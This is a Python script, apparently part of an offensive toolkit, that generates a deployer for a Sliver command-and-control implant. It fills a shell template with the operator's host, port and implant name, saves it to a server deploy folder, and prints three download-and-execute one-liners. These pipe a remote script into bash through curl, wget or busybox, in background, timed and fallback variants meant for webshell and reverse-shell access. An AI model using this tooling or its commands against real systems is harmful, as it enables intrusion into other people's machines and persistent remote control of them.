#!/usr/bin/env python3

from common import *
import argparse
import urllib.request
import random
import os
import sys

# Path Setup

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(SCRIPT_DIR)
DEPLOY_DIR = os.path.join(ROOT_DIR, "server", "deploy")
DEFAULT_TEMPLATE = os.path.join(SCRIPT_DIR, "template.sh")

# Helpers


def generate_outfile_name():
    return "".join(random.choices("0123456789abcdef", k=5))

def load_script(path: str):
    with open(path, "r") as f:
        return f.read()

def save_script(data: str, path: str):
    with open(path, "w") as f:
        f.write(data)

def pull_ip():
    return (urllib.request.urlopen("https://checkip.amazonaws.com").read().decode().strip())

# Main

def generate_payload(implant_name, template=DEFAULT_TEMPLATE, host=pull_ip(), port="8000"):
    if not os.path.isabs(template):
        template = os.path.join(SCRIPT_DIR, template)

    if not os.path.exists(template):
        failed(f"Template does not exist: {template}")
        sys.exit(1)

    os.makedirs(DEPLOY_DIR, exist_ok=True)
    info(f"Loading template ({template})")

    deploy_script = (
        load_script(template)
        .replace("<HOST>", host)
        .replace("<IMPLANT>", implant_name)
        .replace("<PORT>", port)
    )

    file_name = generate_outfile_name()
    full_outpath = os.path.join(DEPLOY_DIR, file_name)

    save_script(deploy_script, full_outpath)
    success(f"Output saved at: {full_outpath}")

    url = f"http://{host}:{port}/deploy/{file_name}"

    execution_methods = {
        0 : ("Background exec, for webshell access -> $ ", f"{BLUE}nohup bash -c 'curl -sSL {url}|bash' &>/dev/null &{RESET}"),
        1 : ("Timed execution, for reverse shells -> $ ", f"{BLUE}timeout 60 curl -sSL {url}|bash{RESET}"),
        2 : ("One liner with utility check & exec -> $ ", f"{BLUE}(command -v curl >/dev/null 2>&1 && curl -fsSL {url}|bash) || (command -v wget >/dev/null 2>&1 && wget -qO- {url}|bash) || (busybox wget -qO- {url}|bash){RESET}")
    }

    for index in range(0, len(execution_methods)):
        success(f"{execution_methods[index][0]+execution_methods[index][1]}")

    info("Done.")

    return execution_methods, url

def main():
    parser = argparse.ArgumentParser(description="Generate a simple quick Sliver implant deployer.")

    parser.add_argument("--implant", "-i", required=True, help="Implant name")
    parser.add_argument("--template", "-t", default=DEFAULT_TEMPLATE, help="Template file")
    parser.add_argument("--host", "-H", default=pull_ip(), help="Remote Host")
    parser.add_argument("--port", "-p", default="8000", help="Remote Port")

    args = parser.parse_args()

    generate_payload(args.implant, args.template, args.host, args.port)

if __name__ == "__main__":
    main()
